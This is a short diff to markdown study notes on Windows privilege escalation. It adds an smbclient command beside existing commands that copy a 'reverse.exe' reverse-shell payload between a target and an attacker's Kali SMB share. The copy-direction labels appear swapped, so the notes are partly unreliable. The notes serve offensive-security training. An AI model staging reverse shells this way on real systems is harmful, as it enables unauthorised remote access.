@@ -26,6 +26,8 @@ Windows Privilege Escalation Techniques
     - On Windows (update the IP address with your Kali IP):
         * `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe` from windows to linux(Attacker_machine).
 	* `copy C:\PrivEsc\reverse.exe \\10.17.11.201\kali\reverse.exe` from linux to windows
+    - To transfer file from Linux to windows through smb .
+        * `smbclient -U <username> "//<windows_IP>/Tools"
 
 ### Windows Privilege Escalation enumeration Tools:
     - `winPEASany.exe`
